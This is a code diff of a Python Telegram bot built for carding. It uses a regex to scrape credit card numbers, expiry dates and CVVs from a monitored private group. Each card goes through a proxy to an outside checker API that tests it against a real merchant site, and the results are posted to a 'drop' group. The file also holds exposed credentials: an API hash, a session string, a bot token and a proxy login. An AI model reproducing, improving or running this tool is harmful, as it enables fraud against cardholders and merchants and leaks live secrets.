@@ -13,17 +13,16 @@ api_hash = "abde39d2fad230528b2695a14102e76a"
 SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
 BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"
 
-PRIVATE_GROUP_ID = -1002682944548  # Group to monitor
-TARGET_GROUP_ID = -1002968335063   # Official drop group
-ADMIN_ID = 8493360284               # Admin Telegram ID
+PRIVATE_GROUP_ID = -1002682944548
+TARGET_GROUP_ID = -1002968335063
+ADMIN_ID = 8493360284
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
-PROXY = "45.41.172.51:5794:juftilus:atasaxde44jl"  # Single proxy for API
+PROXY = "45.41.172.51:5794:juftilus:atasaxde44jl"
 
-NUM_WORKERS = 5  # concurrent card processors
-
-# Regex to match almost all CC formats (pipes, slashes, colons, spaces)
+# ---------------- CARD REGEX ----------------
+# Detects all common formats: pipes, slashes, colons, spaces, mixed
 CARD_REGEX = re.compile(
     r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
 )
@@ -34,8 +33,7 @@ bot_client = Bot(token=BOT_TOKEN)
 
 # ---------------- STATE ----------------
 dropping_enabled = False
-cards_queue = asyncio.Queue()
-session = None  # aiohttp session
+session: aiohttp.ClientSession = None
 
 # ---------------- FUNCTIONS ----------------
 async def process_card(card: str):
@@ -43,7 +41,7 @@ async def process_card(card: str):
     global session
     params = {"site": SITE, "cc": card, "proxy": PROXY}
 
-    for attempt in range(3):  # retry up to 3 times
+    for attempt in range(3):  # retry 3 times
         try:
             async with session.get(API_URL, params=params, timeout=15) as resp:
                 data = await resp.json()
@@ -53,10 +51,11 @@ async def process_card(card: str):
             data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
             await asyncio.sleep(1)
 
+    # Stylish MarkdownV2 response
     cc = escape_markdown(str(data.get('cc')), version=2)
     price = escape_markdown(str(data.get('Price')), version=2)
     response = escape_markdown(str(data.get('Response')), version=2)
-    msg = f"CC: `{cc}`\nPrice: {price}\nResponse: {response}"
+    msg = f"✨ *Card Check Result* ✨\n\n💳 CC: `{cc}`\n💰 Price: {price}\n📊 Response: {response}"
 
     if dropping_enabled:
         try:
@@ -66,14 +65,6 @@ async def process_card(card: str):
             print(f"❌ Failed to send card {card}: {e}")
     else:
         print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")
-
-async def card_worker(worker_id: int):
-    """Worker to process queued cards concurrently"""
-    print(f"[Worker-{worker_id}] Started")
-    while True:
-        card = await cards_queue.get()
-        await process_card(card)
-        cards_queue.task_done()
 
 # ---------------- TELETHON EVENT ----------------
 @user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
@@ -88,9 +79,9 @@ async def card_listener(event):
 
     for match in matches:
         card_str = "|".join(match)
-        # Put card into queue for workers (processed immediately if workers free)
-        await cards_queue.put(card_str)
-        print(f"[+] Card detected and queued: {card_str}")
+        # Process immediately for high activity
+        asyncio.create_task(process_card(card_str))
+        print(f"[+] Card detected and processing immediately: {card_str}")
 
 # ---------------- TELEGRAM COMMANDS ----------------
 async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
@@ -101,7 +92,7 @@ async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
         print(f"[BOT] Admin {user_id} sent /start")
     else:
         await context.bot.send_message(chat_id=update.effective_chat.id,
-                                       text="Access Denied — bot only for admin")
+                                       text="❌ Access Denied — bot only for admin")
         print(f"[BOT] Unauthorized /start by {user_id}")
 
 async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
@@ -130,11 +121,6 @@ async def main():
     # Start Telethon client
     await user_client.start()
     print("✅ Telethon client started. Listening to private group...")
-
-    # Start card workers
-    for i in range(NUM_WORKERS):
-        asyncio.create_task(card_worker(i+1))
-    print(f"[+] {NUM_WORKERS} card workers running...")
 
     # Start Telegram bot
     app = ApplicationBuilder().token(BOT_TOKEN).build()
